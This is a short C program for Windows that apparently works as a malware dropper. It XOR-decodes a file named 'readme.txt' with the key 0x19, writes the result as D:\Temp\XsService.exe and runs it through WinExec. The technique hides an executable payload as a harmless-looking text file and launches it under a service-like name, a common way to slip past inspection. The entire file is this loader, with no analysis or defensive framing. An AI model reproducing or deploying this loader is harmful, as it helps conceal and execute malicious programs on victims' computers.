#include <Windows.h>
#include <direct.h>
#include <stdio.h>

#define  XOR_VAL 0x19
BOOL XorCopyFile(const char *Res,const char *Dest)
{
	FILE *res=NULL,*dest=NULL;
	if ((res=fopen(Res,"rb"))==NULL)
	{
		goto _ERR;
	}
	if ((dest=fopen(Dest,"wb"))==NULL)
	{
		goto _ERR;
	}

	char Buffer[256];
	int  readSize=0;
	while (!feof(res))
	{
		readSize=fread(Buffer,1,sizeof(Buffer),res);
		for (int i=0;i<readSize;i++)
		{
			Buffer[i]^=XOR_VAL;
		}
		fwrite(Buffer,readSize,1,dest);
	}
	fclose(res);
	fclose(dest);
	return TRUE;
_ERR:
	if (res)
	{
		fclose(res);
	}
	if (dest)
	{
		fclose(dest);
	}
	return FALSE;
}


int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	char TargetPath[MAX_PATH];
	mkdir("D:\\Temp");
	strcpy(TargetPath,"D:\\Temp\\XsService.exe");
	XorCopyFile("readme.txt",TargetPath);
	WinExec(TargetPath,SW_SHOWNORMAL);
}